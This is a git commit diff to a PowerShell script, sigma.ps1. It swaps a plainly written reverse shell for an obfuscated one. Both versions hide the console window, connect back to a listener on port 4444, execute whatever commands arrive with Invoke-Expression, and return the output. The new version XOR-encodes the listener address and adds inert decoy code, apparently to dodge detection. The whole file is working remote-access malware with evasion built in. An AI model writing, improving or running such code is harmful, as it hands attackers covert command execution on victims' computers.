63553ca69c4476f82e07fd0b4b9aa5be9ae81f82
Turkey <bellatheunicorn521@gmail.com>
2025-11-22 00:27:19 +0000

    Update sigma.ps1

--- sigma.ps1
+++ sigma.ps1
@@ -1,39 +1,13 @@
-$hwnd = (Get-Process -Id $PID).MainWindowHandle
-if ($hwnd -ne 0) {
-    $signature = @"
-using System;
-using System.Runtime.InteropServices;
-public class WinAPI {
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-}
+Add-Type -Name Win -Namespace Console -MemberDefinition @"
+  [DllImport("user32.dll")]
+  public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
+  [DllImport("kernel32.dll")]
+  public static extern IntPtr GetConsoleWindow();
 "@
-    Add-Type $signature
-    [WinAPI]::ShowWindow($hwnd, 0)  # 0 = SW_HIDE
+
+$consolePtr = [Console.Win]::GetConsoleWindow()
+[Console.Win]::ShowWindowAsync($consolePtr, 0)
+$LHOST = $($k4814='YN:,Phk7';$b=[byte[]](0x68,0x77,0x08,0x02,0x61,0x5E,0x53,0x19,0x68,0x60,0x08,0x1E,0x64);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4814);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})); $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(($Output + $($k8745='YMXmQq-L=lhE';$b=[byte[]](0x39,0x23);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8745);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+if ($false) {
+    $xmlDoc = [xml]::new(); $rootElement = $xmlDoc.CreateElement("Config"); $childElement = $xmlDoc.CreateElement("Setting"); $childElement.InnerText = (Get-Random); $rootElement.AppendChild($childElement) | Out-Null; $xmlDoc.AppendChild($rootElement) | Out-Null; Write-Verbose "Generated XML fragment: $($xmlDoc.OuterXml)"
 }
-
-# Setup TCP connection to attacker
-$client = New-Object System.Net.Sockets.TcpClient("192.168.1.184", 4444)
-$stream = $client.GetStream()
-$reader = New-Object System.IO.StreamReader($stream)
-$writer = New-Object System.IO.StreamWriter($stream)
-$writer.AutoFlush = $true
-
-# Main loop to receive commands and send back output
-while ($true) {
-    try {
-        $command = $reader.ReadLine()
-        if ($command -eq "exit" -or $command -eq $null) { break }
-
-        # Run the command and capture output/errors
-        $output = Invoke-Expression $command 2>&1 | Out-String
-
-        # Send output back
-        $writer.WriteLine($output)
-    } catch {
-        $writer.WriteLine("Error: " + $_.Exception.Message)
-    }
-}
-
-# Cleanup
-$client.Close()
